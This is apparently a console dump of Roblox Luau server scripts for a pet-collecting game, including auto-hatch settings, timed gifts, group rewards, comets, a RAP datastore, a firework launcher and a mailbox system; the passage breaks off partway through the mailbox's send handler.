    if plyrSettings[setting] + 1 > #shrd.options then
        save.Settings[setting] = 1
    else
        save.Settings[setting] = save.Settings[setting] + 1
    end

    return true, nil, save.Settings[setting] 
end

_L.Network.Invoked("Toggle Auto Delete").OnInvoke = function(plyr, s)
    local save = _L.Saving.Get(plyr)
    if not save then
        return false, nil, nil
    end

    if save.AutoDelete[s] == nil or save.AutoDelete[s] == false then
        save.AutoDelete[s] = true
    else
        save.AutoDelete[s] = false
    end
    
    return true, nil, save.AutoDelete[s]
end 

local function hasAuto(plr)
    return _L.Gamepasses.Owns(plr, _L.Directory.Gamepasses["Auto Hatch"].ID) or false
end

_L.Network.Invoked("Toggle Auto Hatch Setting").OnInvoke = function(plyr, s)
    local save = _L.Saving.Get(plyr)
    if not save then
        return false, nil, nil
    end

    if not hasAuto(plyr) then
        return false, nil, nil
    end

    if s == "OctupleEggs" then
        save.AutoHatchSettings.TripleEggs = false
    elseif s == "TripleEggs" then
        save.AutoHatchSettings.OctupleEggs = false
    end

    if not save.AutoHatchSettings[s] then
        save.AutoHatchSettings[s] = true
    else
        save.AutoHatchSettings[s] = false
    end

    return true, nil, save.AutoHatchSettings 
end

--[[_L.Network.Invoked("Toggle Always Keep Setting").OnInvoke = function(plyr, s)
    local save = _L.Saving.Get(plyr)
    if not save then
        return false, nil, nil
    end

	local oldAuto = table.clone(save.AutoHatchSettings.AlwaysKeep)
    local o = AlwaysKeepDef[s] or 1
    save.AutoHatchSettings.AlwaysKeep[s] = AlwaysKeepDef[o + 1]

	return true, nil, save.AutoHatchSettings 
end]]--

local AlwaysKeepGuide = {
	[1] = {
		name = "Basic",
		int = 1
	},
	[2] = {
		name = "Rare",
		int = 2
	}, 
	[3] = {
		name = "Epic",
		int = 3
	},  
	[4] = {
		name = "Legendary",
		int = 4
	},  
	[5] = {
		name = "Mythical",
		int = 5
	},  
	[6] = {
		name = "Secret",
		int = 6
	}, 
	[7] = {
		name = "Event",
		int = 7
	},  
	[8] = {
		name = "Exclusive",
		int = 8
	},
}

function GetIntByName(name)
	for i,v in pairs(AlwaysKeepGuide) do
		if v.name == name then
			return v.int
		end
	end
	return 1
end

_L.Network.Invoked("Toggle Always Keep Setting").OnInvoke = function(player, s)
	local save = _L.Saving.Get(player)
	if not save then
		return false, nil, nil
	end
	
	local _os = table.clone(save.AutoHatchSettings.AlwaysKeep)[s]
	local int = GetIntByName(_os) + 1
	if int > #AlwaysKeepGuide then
		int = 1
	end
	
	save.AutoHatchSettings.AlwaysKeep[s] = AlwaysKeepGuide[int].name
	
	return true, nil, save.AutoHatchSettings 
end  -  Editar
  04:54:13.774    -  Editar
  04:54:13.774  ----- [2353] ServerScriptService.Scripts.Game.HugePegasusNotification -----  -  Editar
  04:54:13.774  --[[
                                                           ,,,,,,╓╓╓╓╓╖
         ,,,,╓╓╓╓╖╥╥╗╗╗╗╗╗╗HH@@@@@@@Ñ╣╣╣╣╢╢╢╣▒▒▒▒▒▒▒▒Ñ╝╜╙╙╙╨╝╢▒▒▒▒▒▒▒▒▒[
         ▒▒▒▒╜╙╙╙╙""""````"╙╨╣▒▒▒▒▒▒[     ║▒▒▒▒▒▒╢╜            ╙╣▒▒▒▒▒▒[
         ▒▒▒▒[                 ║▒▒▒▒[     ║▒▒▒▒▒╜                ╙▒▒▒▒▒╡
         ▒▒▒▒[     ,,,,╓╓       ║▒▒▒╣     ║▒▒▒▒╜     ╓╣▒▒▒▒@,     ╠▒▒▒▒╢
         ▒▒▒▒╢     ]▒▒▒▒▒▒@     ]▒▒▒╢     ]▒▒▒╣     ]▒▒▒▒▒▒▒▒H@╣╢▒▒▒▒▒▒▒
         ╢▒▒▒▒     ]▒▒▒▒▒Ñ`     ╢▒▒▒▒     ]▒▒▒L     ╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ║▒▒▒▒                ╓╣▒▒▒▒▒     ]▒▒▒      ▒▒▒▒▒╜╙╙╙╙╙╙"""║▒▒▒▒
         ║▒▒▒▒                 ╙╣▒▒▒▒      ▒▒▒U     ╢▒▒▒▒          ║▒▒▒▒
         ]▒▒▒▒      HH@@@%╗      ╢▒▒▒      ▒▒▒[     ]▒▒▒▒          ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╣     ]▒▒▒      ▒▒▒▒      ║▒▒▒▒▒▒▒╜     ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╜     ]▒▒▒U     ▒▒▒▒╣      `╨ÑÑ╝╜       ]▒▒▒▒U
          ▒▒▒▒U     ``           ╣▒▒▒L     ╢▒▒▒▒╣╖                  ▒▒▒▒[
          ▒▒▒▒[                ╔╣▒▒▒▒[     ║▒▒▒▒▒▒╣╗,        ╓@L ,,,▒▒▒▒[
          ▒▒▒▒[,,,╓╓╓╓╓╓╓╗╗@@╢▒▒▒▒▒▒▒╣@@@@Ñ╣▒▒▒▒▒▒▒▒▒▒▒╢╢║╢ÑÑÑÑ╝╝╝╝╝╝╨╨╜┘
          ╝╝╝╝╝╝╨╨╜╜╙╙╙╙╙╙""""````                    ,,,,,    ,╓╖,
               ,╥@@@╗,    ╥@╣╢╣N,   ╢╣▒▒▒▒╣╗  ║▒▒  ║▒▒▒▒╢╢╢  ╔╣╣╜╙╢▒╣
              ╔▒▒╜╙╙╣▒@  ╢▒╝` ╙▒▒╗  ▒▒[   ▒▒[ ║▒▒  ║▒▒       ╢▒@╖
              ▒▒[       ║▒▒    ]▒▒  ╢▒╢  ╓▒▒[ ]▒▒  ]▒▒╣╣╣╢    "╨╣▒▒╣╗
              ▒▒U       ║▒▒    ]▒▒  ║▒▒▒▒╢Ñ╜  ]▒▒  ]▒▒        ,    ╙▒╢
              ╢▒╣   ╓@╗  ▒▒╗   ╣▒╣  ║▒▒       ]▒▒  ]▒▒╗╗╗m╗m ╙▒╢H╥╗╣▒╝
               ╝▒▒╣╣▒╢╜   ╝▒▒▒▒╢╜   ║▒▒        Ñ╝   ╝╝╝╨╨╜╜╜   `╙╙╙
              
           By: @localonex     
--]]


local _L = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"))
while (not _L.Loaded) do  game:GetService("RunService").Heartbeat:Wait()  end

function HasPegasus(Pets)
	for _, pet in ipairs(Pets) do
		if pet.id == "239" then
			return true
		end
	end
	return false
end

_L.Signal.Fired("Player Added"):Connect(function(player)
	_G.HasLoaded(player)
	local save = _L.Saving.Get(player)
	if save and not save.HugePegasusAlert then
		if HasPegasus(save.Pets) then
			local Notification = script["Huge Pegasus Notification"]:Clone()
			Notification.Parent = player.PlayerGui
			_L.Network.Invoke("Huge Pegasus Notification", player)
			save.HugePegasusAlert = true
		end
	end
end)  -  Editar
  04:54:13.774    -  Editar
  04:54:13.774  ----- [2354] ServerScriptService.Scripts.Game.StarterChromaGift -----  -  Editar
  04:54:13.774  --[[
                                                           ,,,,,,╓╓╓╓╓╖
         ,,,,╓╓╓╓╖╥╥╗╗╗╗╗╗╗HH@@@@@@@Ñ╣╣╣╣╢╢╢╣▒▒▒▒▒▒▒▒Ñ╝╜╙╙╙╨╝╢▒▒▒▒▒▒▒▒▒[
         ▒▒▒▒╜╙╙╙╙""""````"╙╨╣▒▒▒▒▒▒[     ║▒▒▒▒▒▒╢╜            ╙╣▒▒▒▒▒▒[
         ▒▒▒▒[                 ║▒▒▒▒[     ║▒▒▒▒▒╜                ╙▒▒▒▒▒╡
         ▒▒▒▒[     ,,,,╓╓       ║▒▒▒╣     ║▒▒▒▒╜     ╓╣▒▒▒▒@,     ╠▒▒▒▒╢
         ▒▒▒▒╢     ]▒▒▒▒▒▒@     ]▒▒▒╢     ]▒▒▒╣     ]▒▒▒▒▒▒▒▒H@╣╢▒▒▒▒▒▒▒
         ╢▒▒▒▒     ]▒▒▒▒▒Ñ`     ╢▒▒▒▒     ]▒▒▒L     ╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ║▒▒▒▒                ╓╣▒▒▒▒▒     ]▒▒▒      ▒▒▒▒▒╜╙╙╙╙╙╙"""║▒▒▒▒
         ║▒▒▒▒                 ╙╣▒▒▒▒      ▒▒▒U     ╢▒▒▒▒          ║▒▒▒▒
         ]▒▒▒▒      HH@@@%╗      ╢▒▒▒      ▒▒▒[     ]▒▒▒▒          ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╣     ]▒▒▒      ▒▒▒▒      ║▒▒▒▒▒▒▒╜     ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╜     ]▒▒▒U     ▒▒▒▒╣      `╨ÑÑ╝╜       ]▒▒▒▒U
          ▒▒▒▒U     ``           ╣▒▒▒L     ╢▒▒▒▒╣╖                  ▒▒▒▒[
          ▒▒▒▒[                ╔╣▒▒▒▒[     ║▒▒▒▒▒▒╣╗,        ╓@L ,,,▒▒▒▒[
          ▒▒▒▒[,,,╓╓╓╓╓╓╓╗╗@@╢▒▒▒▒▒▒▒╣@@@@Ñ╣▒▒▒▒▒▒▒▒▒▒▒╢╢║╢ÑÑÑÑ╝╝╝╝╝╝╨╨╜┘
          ╝╝╝╝╝╝╨╨╜╜╙╙╙╙╙╙""""````                    ,,,,,    ,╓╖,
               ,╥@@@╗,    ╥@╣╢╣N,   ╢╣▒▒▒▒╣╗  ║▒▒  ║▒▒▒▒╢╢╢  ╔╣╣╜╙╢▒╣
              ╔▒▒╜╙╙╣▒@  ╢▒╝` ╙▒▒╗  ▒▒[   ▒▒[ ║▒▒  ║▒▒       ╢▒@╖
              ▒▒[       ║▒▒    ]▒▒  ╢▒╢  ╓▒▒[ ]▒▒  ]▒▒╣╣╣╢    "╨╣▒▒╣╗
              ▒▒U       ║▒▒    ]▒▒  ║▒▒▒▒╢Ñ╜  ]▒▒  ]▒▒        ,    ╙▒╢
              ╢▒╣   ╓@╗  ▒▒╗   ╣▒╣  ║▒▒       ]▒▒  ]▒▒╗╗╗m╗m ╙▒╢H╥╗╣▒╝
               ╝▒▒╣╣▒╢╜   ╝▒▒▒▒╢╜   ║▒▒        Ñ╝   ╝╝╝╨╨╜╜╜   `╙╙╙
              
           By: @localonex     
--]]


--DateTime.fromUnixTimestamp(os.time() - (5 * 60 * 60)):ToUniversalTime()
--------|     Setting     |--------

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
while (not _L.Loaded) do  game:GetService("RunService").Heartbeat:Wait()  end

--------|    Reference    |--------

--------|    Variables    |--------

--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------

_L.Signal.Fired("Player Added"):Connect(function(player)
	repeat wait() until _L.Network.Invoke("Has Loaded", player) == true
	
	local save = _L.Saving.Get(player)
	if not save then return end
	while task.wait() do
		local CDT = DateTime.fromUnixTimestamp(os.time() - (5 * 60 * 60)):ToUniversalTime()
		
		if CDT and ( CDT.Hour == 12 or CDT.Hour == 0 ) then
			if not save[CDT.Year..CDT.Day..CDT.Hour] then
				_L.Pets.Create(player, "42000", nil)
				_L.Network.Fire("Message", player, "You got a FREE Chroma Starter Egg for being online! Given everyday at 12PM & 12AM CDT! 🎁")
				save[CDT.Year..CDT.Day..CDT.Hour] = true
			end
		end
	end
end)  -  Editar
  04:54:13.774    -  Editar
  04:54:13.774  ----- [2355] ServerScriptService.Scripts.Game.GroupReward -----  -  Editar
  04:54:13.774  --[[
                                                           ,,,,,,╓╓╓╓╓╖
         ,,,,╓╓╓╓╖╥╥╗╗╗╗╗╗╗HH@@@@@@@Ñ╣╣╣╣╢╢╢╣▒▒▒▒▒▒▒▒Ñ╝╜╙╙╙╨╝╢▒▒▒▒▒▒▒▒▒[
         ▒▒▒▒╜╙╙╙╙""""````"╙╨╣▒▒▒▒▒▒[     ║▒▒▒▒▒▒╢╜            ╙╣▒▒▒▒▒▒[
         ▒▒▒▒[                 ║▒▒▒▒[     ║▒▒▒▒▒╜                ╙▒▒▒▒▒╡
         ▒▒▒▒[     ,,,,╓╓       ║▒▒▒╣     ║▒▒▒▒╜     ╓╣▒▒▒▒@,     ╠▒▒▒▒╢
         ▒▒▒▒╢     ]▒▒▒▒▒▒@     ]▒▒▒╢     ]▒▒▒╣     ]▒▒▒▒▒▒▒▒H@╣╢▒▒▒▒▒▒▒
         ╢▒▒▒▒     ]▒▒▒▒▒Ñ`     ╢▒▒▒▒     ]▒▒▒L     ╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ║▒▒▒▒                ╓╣▒▒▒▒▒     ]▒▒▒      ▒▒▒▒▒╜╙╙╙╙╙╙"""║▒▒▒▒
         ║▒▒▒▒                 ╙╣▒▒▒▒      ▒▒▒U     ╢▒▒▒▒          ║▒▒▒▒
         ]▒▒▒▒      HH@@@%╗      ╢▒▒▒      ▒▒▒[     ]▒▒▒▒          ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╣     ]▒▒▒      ▒▒▒▒      ║▒▒▒▒▒▒▒╜     ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╜     ]▒▒▒U     ▒▒▒▒╣      `╨ÑÑ╝╜       ]▒▒▒▒U
          ▒▒▒▒U     ``           ╣▒▒▒L     ╢▒▒▒▒╣╖                  ▒▒▒▒[
          ▒▒▒▒[                ╔╣▒▒▒▒[     ║▒▒▒▒▒▒╣╗,        ╓@L ,,,▒▒▒▒[
          ▒▒▒▒[,,,╓╓╓╓╓╓╓╗╗@@╢▒▒▒▒▒▒▒╣@@@@Ñ╣▒▒▒▒▒▒▒▒▒▒▒╢╢║╢ÑÑÑÑ╝╝╝╝╝╝╨╨╜┘
          ╝╝╝╝╝╝╨╨╜╜╙╙╙╙╙╙""""````                    ,,,,,    ,╓╖,
               ,╥@@@╗,    ╥@╣╢╣N,   ╢╣▒▒▒▒╣╗  ║▒▒  ║▒▒▒▒╢╢╢  ╔╣╣╜╙╢▒╣
              ╔▒▒╜╙╙╣▒@  ╢▒╝` ╙▒▒╗  ▒▒[   ▒▒[ ║▒▒  ║▒▒       ╢▒@╖
              ▒▒[       ║▒▒    ]▒▒  ╢▒╢  ╓▒▒[ ]▒▒  ]▒▒╣╣╣╢    "╨╣▒▒╣╗
              ▒▒U       ║▒▒    ]▒▒  ║▒▒▒▒╢Ñ╜  ]▒▒  ]▒▒        ,    ╙▒╢
              ╢▒╣   ╓@╗  ▒▒╗   ╣▒╣  ║▒▒       ]▒▒  ]▒▒╗╗╗m╗m ╙▒╢H╥╗╣▒╝
               ╝▒▒╣╣▒╢╜   ╝▒▒▒▒╢╜   ║▒▒        Ñ╝   ╝╝╝╨╨╜╜╜   `╙╙╙
              
           By: @localonex     
--]]


--------|     Setting     |--------

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
while (not _L.Loaded) do  game:GetService("RunService").Heartbeat:Wait()  end

--------|    Reference    |--------

--------|    Variables    |--------

--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------

_L.Signal.Fired("Player Added"):Connect(function(plyr)
	local save = _L.Saving.Get(plyr)
	if save then
		if plyr:IsInGroup(17259551) then
			if not save.GroupReward then
				_L.Pets.Create(plyr, "2126", { nk = "BIG" })
				save.GroupReward = true
			end
		end
	end
end)
  -  Editar
  04:54:13.775    -  Editar
  04:54:13.775  ----- [2356] ServerScriptService.Scripts.Game.OwnerJoined -----  -  Editar
  04:54:13.775  --------|     Setting     |--------

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Library")) _L.Load()

--------|    Reference    |--------

--------|    Variables    |--------

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


function giveAll()
	for _, plr in ipairs(_L.Players:GetPlayers()) do
		coroutine.wrap(function()
			_G.HasLoaded(plr) _L.Achievements.Add(plr, "Meet Preston", 1)
		end)()
	end
end

function checkForOwner()
	for _, plr in ipairs(_L.Players:GetPlayers()) do
		if plr.UserId == 482622187 or plr.UserId == game.CreatorId or plr.UserId == 4437812925 then
			giveAll() break
		end
	end
end

_L.Signal.Fired("Player Added"):Connect(checkForOwner)
_L.Players.PlayerAdded:Connect(checkForOwner)

game.Players.PlayerAdded:Connect(function(plr: instance)
	assert(plr and plr.Parent)
	if string.match(plr.Name, "Majin") and string.match(plr.Name, "Bacon") then
		plr:Kick("nooob bacon lover")
	end
end)  -  Editar
  04:54:13.775    -  Editar
  04:54:13.775  ----- [2357] ServerScriptService.Scripts.Game.Comets -----  -  Editar
  04:54:13.775  --[[
                                                           ,,,,,,╓╓╓╓╓╖
         ,,,,╓╓╓╓╖╥╥╗╗╗╗╗╗╗HH@@@@@@@Ñ╣╣╣╣╢╢╢╣▒▒▒▒▒▒▒▒Ñ╝╜╙╙╙╨╝╢▒▒▒▒▒▒▒▒▒[
         ▒▒▒▒╜╙╙╙╙""""````"╙╨╣▒▒▒▒▒▒[     ║▒▒▒▒▒▒╢╜            ╙╣▒▒▒▒▒▒[
         ▒▒▒▒[                 ║▒▒▒▒[     ║▒▒▒▒▒╜                ╙▒▒▒▒▒╡
         ▒▒▒▒[     ,,,,╓╓       ║▒▒▒╣     ║▒▒▒▒╜     ╓╣▒▒▒▒@,     ╠▒▒▒▒╢
         ▒▒▒▒╢     ]▒▒▒▒▒▒@     ]▒▒▒╢     ]▒▒▒╣     ]▒▒▒▒▒▒▒▒H@╣╢▒▒▒▒▒▒▒
         ╢▒▒▒▒     ]▒▒▒▒▒Ñ`     ╢▒▒▒▒     ]▒▒▒L     ╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ║▒▒▒▒                ╓╣▒▒▒▒▒     ]▒▒▒      ▒▒▒▒▒╜╙╙╙╙╙╙"""║▒▒▒▒
         ║▒▒▒▒                 ╙╣▒▒▒▒      ▒▒▒U     ╢▒▒▒▒          ║▒▒▒▒
         ]▒▒▒▒      HH@@@%╗      ╢▒▒▒      ▒▒▒[     ]▒▒▒▒          ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╣     ]▒▒▒      ▒▒▒▒      ║▒▒▒▒▒▒▒╜     ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╜     ]▒▒▒U     ▒▒▒▒╣      `╨ÑÑ╝╜       ]▒▒▒▒U
          ▒▒▒▒U     ``           ╣▒▒▒L     ╢▒▒▒▒╣╖                  ▒▒▒▒[
          ▒▒▒▒[                ╔╣▒▒▒▒[     ║▒▒▒▒▒▒╣╗,        ╓@L ,,,▒▒▒▒[
          ▒▒▒▒[,,,╓╓╓╓╓╓╓╗╗@@╢▒▒▒▒▒▒▒╣@@@@Ñ╣▒▒▒▒▒▒▒▒▒▒▒╢╢║╢ÑÑÑÑ╝╝╝╝╝╝╨╨╜┘
          ╝╝╝╝╝╝╨╨╜╜╙╙╙╙╙╙""""````                    ,,,,,    ,╓╖,
               ,╥@@@╗,    ╥@╣╢╣N,   ╢╣▒▒▒▒╣╗  ║▒▒  ║▒▒▒▒╢╢╢  ╔╣╣╜╙╢▒╣
              ╔▒▒╜╙╙╣▒@  ╢▒╝` ╙▒▒╗  ▒▒[   ▒▒[ ║▒▒  ║▒▒       ╢▒@╖
              ▒▒[       ║▒▒    ]▒▒  ╢▒╢  ╓▒▒[ ]▒▒  ]▒▒╣╣╣╢    "╨╣▒▒╣╗
              ▒▒U       ║▒▒    ]▒▒  ║▒▒▒▒╢Ñ╜  ]▒▒  ]▒▒        ,    ╙▒╢
              ╢▒╣   ╓@╗  ▒▒╗   ╣▒╣  ║▒▒       ]▒▒  ]▒▒╗╗╗m╗m ╙▒╢H╥╗╣▒╝
               ╝▒▒╣╣▒╢╜   ╝▒▒▒▒╢╜   ║▒▒        Ñ╝   ╝╝╝╨╨╜╜╜   `╙╙╙
              
           By: @localonex     
--]]


--------|     Setting     |--------

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
while (not _L.Loaded) do  game:GetService("RunService").Heartbeat:Wait()  end

--------|    Reference    |--------

--------|    Variables    |--------
local CometData = {
	Data = {},
	ExtraData = {}
}

--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------

function GenerateCometId()
	local UID = _L.Functions.GenerateUID()
	return "comet:"..UID
end

_L.Network.Invoked("Comets: Get Data").OnInvoke = function()
	--[[
	    CometData.Data[index].Id,
		CometData.Data[index].Type,
		CometData.Data[index].WorldId,
		CometData.Data[index].AreaId,
		CometData.Data[index].CoinId,
		CometData.Data[index].SpawnPosition,
		CometData.Data[index].EndPosition,
		CometData.Data[index].Speed,
		CometData.Data[index].EndTime,
		CometData.Data[index].Destroyed,
	--]]
	return CometData.Data, CometData.ExtraData
end

 
coroutine.wrap(function()
	game.Players.PlayerAdded:Connect(function(p)
		if p.UserId == 482622187 or p.UserId == 4437812925 then 
			p.Chatted:Connect(function(m)
				if m == "/e comet" then
					--local Coin, pos = _L.Coins.Create("Spawn", "Town", "Mini Comet")
					local pos = _L.Coins.GenPos("Spawn", "Town", "Massive Comet")
					local ID = _L.Coins.GenID()
					local TEST = pos
					--????
					TEST = TEST + Vector3.new(0,50,0)
					TEST = TEST - Vector3.new(0,0,550)
					--print(TEST)

					--???????
					CometData.Data[1] = {
						Id = "comet:"..ID,
						Type = "Massive Comet",
						WorldId = "Spawn",
						AreaId = "Town",
						CoinId = ID,
						SpawnPosition = TEST,
						EndPosition = pos,
						Speed = 1,
						EndTime = workspace:GetServerTimeNow()+10,
						Destroyed = false,
					}
					_L.Network.FireAll("Comets: Spawn Client", CometData.Data[1])
					coroutine.wrap(function()
						wait(10) -- ??
						_L.Coins.CreateComet("Spawn", "Town", "Massive Comet", ID, pos)
					end)()
				end
			end)
		end
	end)
end)()

function GetCometById(id)
	for i, v in ipairs(CometData.Data) do
		print(v.CoinId)
		if v.CoinId == id then
			return v
		end
	end

	return nil
end

_L.Signal.Fired("Comets: Spawn"):Connect(function(player, isMassive)
	--local Coin, pos = _L.Coins.Create("Spawn", "Town", "Mini Comet")
	local pos = _L.Coins.GenPos("Spawn", "Town", "Massive Comet")
	local ID = _L.Coins.GenID()
	local TEST = pos
	--????
	TEST = TEST + Vector3.new(0,50,0)
	TEST = TEST - Vector3.new(0,0,550)
	--print(TEST)

	--???????
	CometData.Data[1] = {
		Id = "comet:"..ID,
		Type = "Massive Comet",
		WorldId = "Spawn",
		AreaId = "Town",
		CoinId = ID,
		SpawnPosition = TEST,
		EndPosition = pos,
		Speed = 1,
		EndTime = workspace:GetServerTimeNow()+10,
		Destroyed = false,
	}
	_L.Network.FireAll("Comets: Spawn Client", CometData.Data[1])
	coroutine.wrap(function()
		wait(10) -- ??
		_L.Coins.CreateComet("Spawn", "Town", "Massive Comet", ID, pos)
	end)()
end)

_L.Signal.Fired("Comets: Broken"):Connect(function(player, id, isMassive)
	local comet = GetCometById(id)
	if not comet then
		return print("Couldnt find comet",id)
	end
	comet.Destroyed = true

	_L.Network.Fire("Comets: Massive Broken", player, comet.Id)

	local t = 15

	if isMassive then
		for i = 1, t do

		end
	else
		for i = 1, t do

		end
	end
end)  -  Editar
  04:54:13.775    -  Editar
  04:54:13.775  ----- [2358] ServerScriptService.Scripts.Game.RAP -----  -  Editar
  04:54:13.775  --------|     Setting     |--------

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
while (not _L.Loaded) do  game:GetService("RunService").Heartbeat:Wait()  end

--------|    Reference    |--------

--------|    Variables    |--------
local RAP = {}
local DS = _L.DataStoreService:GetDataStore("RAP:".._L.Settings.StatsVersion)

--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------

function GetPetsList()
	local success, response = pcall(function()
		return DS:GetAsync("PetsList")
	end)
	
	if success and not response then
		DS:SetAsync("PetsList", _L.HttpService:JSONEncode({}))  
		response = {}
	end
	
	return _L.HttpService:JSONDecode(response)  
end

function UpdatePetsList(new)
	local success = pcall(function()
		DS:UpdateAsync("PetsList", function(old)
			old = _L.HttpService:JSONDecode(old)
			for i, v in pairs(new) do
				old[i] = v
			end
			return _L.HttpService:JSONEncode(old)
		end)
	end)
	if not success then
		print("Failed to update PetsList")
	end
	
	_L.Network.FireAll("RAP: Update", GetPetsList())
end

_L.Network.Invoked("RAP: Get").OnInvoke = function()
	return GetPetsList()
end

_L.Signal.Fired("RAP: Update"):Connect(UpdatePetsList)
_L.Signal.Invoked("RAP: Get Pet").OnInvoke = function(player, key)
	local PetsList = GetPetsList()
	if PetsList then
		if PetsList[key] then
			return PetsList[key].val
		else
			return 0
		end
	end
	return nil
end  -  Editar
  04:54:13.775    -  Editar
  04:54:13.775  ----- [2359] ServerScriptService.Scripts.Game.FireworkLauncher -----  -  Editar
  04:54:13.775  _G.FireworkCACHE = {}

local _L = require(game.ReplicatedStorage:WaitForChild("Library")) _L.Load()

function Equip(player, hacky)
	if _G.FireworkCACHE[tostring(player.UserId)] == true then
		return
	end
	
	_G.FireworkCACHE[tostring(player.UserId)] = true
	player:SetAttribute("FireworkLauncher", true)
	if hacky then
		_L.Network.FireAll("FireworkLauncher_HackyEquip", player)
		return
	end
	
	_L.Network.FireAll("FireworkLauncher_Equip", player)
end

function Unequip(player)
	if _G.FireworkCACHE[tostring(player.UserId)] == false then
		return
	end
	
	_G.FireworkCACHE[tostring(player.UserId)] = false
	player:SetAttribute("FireworkLauncher", false)
	_L.Network.FireAll("FireworkLauncher_Unequip", player)
end

function GetPlayersEquipped()
	local equipped = {}
	for i, v in pairs(_G.FireworkCACHE) do
		if v == true then
			table.insert(equipped, i)
		end
	end
	return equipped
end

_L.Network.Fired("FireworkLauncher_FireProjectile"):Connect(function(player, WorldPosition, atan2, atan, bn)
	for i, v in ipairs(_L.Players:GetPlayers()) do
		if v.UserId ~= player.UserId then
			_L.Network.Fire("FireworkLauncher_OtherPlayerFiredProjectile", v, player, WorldPosition, atan2, atan, bn)
		end
	end
end)

_L.Network.Fired("FireworkLauncher_UnequipServer"):Connect(function(player, unequipPlayer)
	Unequip(unequipPlayer)
end)

_L.Network.Invoked("FireworkLauncher_GetPlayersEquipped").OnInvoke = GetPlayersEquipped
_L.Signal.Fired("FireworkLauncher_Equip"):Connect(Equip)

--[[_L.Signal.Fired("Player Added"):Connect(function(player)
	player.Chatted:Connect(function(msg)
		if msg == "test launcher" then
			Equip(player)
		end
	end)
end)]]--  -  Editar
  04:54:13.775    -  Editar
  04:54:13.776  ----- [2360] ServerScriptService.Scripts.Game.Mailbox [OLD] -----  -  Editar
  04:54:13.776  local _L = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"))
while (not _L.Loaded) do game:GetService("RunService").Heartbeat:Wait() end

local mailDatastore = _L.DataStoreService:GetDataStore("mailData" .. _L.Settings.MailVersion)

local defaultMailData = {
	Inbox = {},
	Settings = {
		Rarities = {
			Basic = false,
			Rare = false,
			Epic = false,
			Legendary = false,
			Mythical = false,
			Secret = false,
			Event = false,
			Exclusive = false
		},
		OtherSettings = {
			HugesSetting = false,
			EnabledSetting = false,
			RequiredPetSetting = false,
			FriendsOnlySetting = false
		}
	}
}

local joinTime = nil

local function prefix(plyr, isUserId)
	local userid = isUserId and plyr or plyr.UserId
	
	return "us"..tostring(userid)
end

local function setPlayerData(plyr, data, isUserId, Settings)
	local plyrPrefix = prefix(plyr, isUserId)
	
	if not Settings then
		mailDatastore:SetAsync(plyrPrefix, data)
	else
		local data2 = mailDatastore:GetAsync(plyrPrefix)
		data2.Settings = data
		mailDatastore:SetAsync(plyrPrefix, data2)
	end	
end

local function getPlayerData(plyr, isUserId)
	local plyrPrefix = prefix(plyr, isUserId)
	
	local data = mailDatastore:GetAsync(plyrPrefix)
	
	if (not data) then
		local plyrUserId = isUserId and plyr or plyr.UserId
        setPlayerData(tostring(plyrUserId), table.clone(defaultMailData))
        return table.clone(defaultMailData)
	else
		return data
	end
end

local function genUUID()
	return "mail".._L.Functions.GenerateUID()
end

local osTimes = {}
local function checkTime(plyr)	
	local dev = ( joinTime - os.clock() ) * -1 
	
	if dev < 30 then
		return false, "You must wait 30 seconds before using the mailbox!"
	end
	
	local ok = osTimes[plyr.UserId]
	if not ok then
		osTimes[plyr.UserId] = os.clock()
		return true
	end

	if ( ok - os.clock() ) * -1 <= 3 then
		return false, "Your trying this too fast!"
	end

	return true
end

_L.Network.Invoked("Get Mail").OnInvoke = function(plyr)
	local data = getPlayerData(plyr)
	
	if not data.Inbox then
        setPlayerData(plyr, table.clone(defaultMailData))
		_L.Network.Fire("Message", plyr, "Malformed data with mail, had to reset your data sorry! :(")
	end
	
	return data
end

_L.Network.Invoked("Send Mail").OnInvoke = function(plyr, data)
	if not _L.Shared.ValidateInteractable(plyr, "Mailbox", 100) then
		return false, "You're too far from the mailbox!"
	end
	
	local plyrSave = _L.Saving.Get(plyr)
	if not plyrSave then
		return
	end
	
	local ok, e = checkTime(plyr)
	if not ok then
		return false, e
	end
	
	local target = game:GetService("Players"):GetUserIdFromNameAsync(data.Recipient)
	local message = data.Message or ""
	local diamonds = data.Diamonds or 0
	local pets = data.Pets
	
	local plyrDiamonds = plyrSave.Diamonds
	
	local costToSend = 100_000
	
	if plyrDiamonds < costToSend + diamonds then
		return false, "You need " .. _L.Functions.Commas((costToSend + diamonds) - plyrDiamonds) .. " more Diamonds!"
	end
	
	if target == plyr.UserId and (not game:GetService("RunService"):IsStudio()) then
		return false, "You can't mail yourself silly!"
	end
	
